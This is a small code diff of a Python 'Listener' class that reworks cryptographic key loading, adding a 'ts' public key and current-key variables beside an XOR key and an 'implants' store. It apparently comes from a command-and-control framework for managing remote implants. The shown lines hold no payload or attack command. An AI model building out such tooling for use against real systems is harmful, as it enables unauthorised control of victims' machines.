@@ -34,9 +34,11 @@ class Listener(object):
         # Crypto values
         self.initial_private_key = asymmetric.private_key_from_bytes(self.config.config['crypto']['private_key'])
         self.initial_public_key = self.initial_private_key.public_key
-        self.initial_rc6_key = self.config.config['crypto']['sym_key']
+        self.initial_ts_pubkey = asymmetric.public_key_from_bytes(self.config.config['crypto']['ts_pk'])
+        self.current_private_key = self.initial_private_key
+        self.current_public_key = self.initial_public_key
+        self.current_ts_pubkey = self.initial_ts_pubkey
         self.xor_key = ast.literal_eval(self.config.config['crypto']['xor_key'])
-        self.ts_pubkey = asymmetric.public_key_from_bytes(self.config.config['crypto']['ts_pk'])
 
         # Implant Runtime Vars
         self.implants = {}
